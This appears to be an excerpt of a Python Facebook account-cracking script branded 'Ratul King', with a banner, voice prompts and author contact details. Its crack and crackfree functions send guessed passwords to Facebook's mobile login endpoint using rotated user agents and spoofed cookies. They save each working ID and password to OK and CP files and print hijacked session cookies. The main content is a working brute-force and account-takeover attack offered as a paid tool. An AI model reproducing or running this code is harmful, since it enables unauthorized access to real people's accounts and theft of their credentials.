...
os.system('espeak -a 300 " Update, Version, 3.2"')
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mUpdate Version 3.2😎...? ')
os.system('espeak -a 300 " Tools, Is, Paid, Free, User, Not, Allow"')
os.system('espeak -a 300 " Ratul, Boss, Is, Always, King, Ok, Bro..."')
time.sleep(5)
os.system('clear')
os.system('espeak -a 600 " Join, My, Script, Gift, Group"')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY SCRIPT GIFT GROUP")
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/profile.php?id=100089787865577')
#------------------[ Ratul-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/Ratul.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mRATUL ]\33[1;38m        ║\033[1;31m 
╠══[Facebook                 • MAR-RATUL ]    ║  \033[1;97m  
╠══[Github                   • \33[1;38mRATUL-KING ]   ║\33[1;34m   
╠══[Whatsapp                 • 01834837550 ]  ║\33[1;35m 
╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
╠══[VERSION                  • 3.2 ]          ║\033[1;35m
╠══[ADREES                   • CHUIDAR LAND]  ║\33[1;38m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m """
os.system('clear')
print(logo)
os.system('espeak -a 300 " Your,   Real,  Name,"')
uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  Ratul,  King,  Tools"')
pass
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Ratul•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    # 'cookie': 'sb=DhMNZarjOe_riNXEewrIDEg1; wd=852x1716; datr=DhMNZTysE3cd_HtocSheMVty; fr=07DGYkhmZucwCMK3e..BlDRMO.hA.AAA.0.0.BlDRNT.AWWVi2VwbZc; dpr=1.6901196241378784',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Ratul-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[Ratul-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Ratul,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Ratul-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Ratul-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Ratul-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ratul, Ok, id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
